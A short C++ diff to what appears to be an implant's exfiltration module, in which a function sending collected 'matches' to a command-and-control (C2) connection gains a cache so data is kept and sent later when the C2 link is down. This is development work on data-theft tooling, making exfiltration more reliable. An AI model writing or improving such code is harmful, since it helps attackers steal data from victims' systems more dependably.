@@ -1,6 +1,6 @@
 #include "exfil.h"
 
-void exfil_matches(C2 &c2con,std::vector<Match>& mvec)
+void exfil_matches(C2 &c2con,std::vector<Match>& mvec, CacheManager& cachemananger)
 {
 	LOG("exfiltrating matches : " << (uint32_t)mvec.size());
 	netpack::Packet p(1);
@@ -19,7 +19,7 @@ void exfil_matches(C2 &c2con,std::vector<Match>& mvec)
 	}
 	else {
 		c2con.find_and_connect_async();
-		LOG("c2 connection not alive. CACHE NOT IMPLEMENTED");
+		cachemananger.cache(p);
 	}
 
 }
